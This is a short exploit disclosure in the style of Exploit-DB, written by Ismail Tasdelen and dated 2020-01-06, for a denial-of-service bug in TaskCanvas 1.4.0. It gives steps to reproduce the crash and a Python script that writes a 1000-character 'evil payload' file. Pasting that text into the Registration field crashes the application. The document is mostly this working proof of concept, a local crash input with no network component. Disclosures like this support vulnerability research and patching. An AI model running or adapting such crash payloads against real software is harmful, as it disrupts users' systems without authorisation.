# Exploit Title: TaskCanvas 1.4.0 - 'Registration' Denial Of Service
# Exploit Author : Ismail Tasdelen
# Exploit Date: 2020-01-06
# Vendor Homepage : https://www.digitalvolcano.co.uk/
# Link Software : https://www.digitalvolcano.co.uk/taskcanvasdownload.html
# Tested on OS: Windows 10
# CVE : N/A

'''
Proof of Concept (PoC):
=======================

1.Download and install TaskCanvas
2.Run the python operating script that will create a file (poc.txt)
3.Run the software "Registration -> Enter Registration Code
4.Copy and paste the characters in the file (poc.txt)
5.Paste the characters in the field 'Registration' and click on 'Ok'
6.TaskCanvas Crashed
'''

#!/usr/bin/python
    
buffer = "A" * 1000
 
payload = buffer
try:
    f=open("poc.txt","w")
    print("[+] Creating %s bytes evil payload." %len(payload))
    f.write(payload)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created.")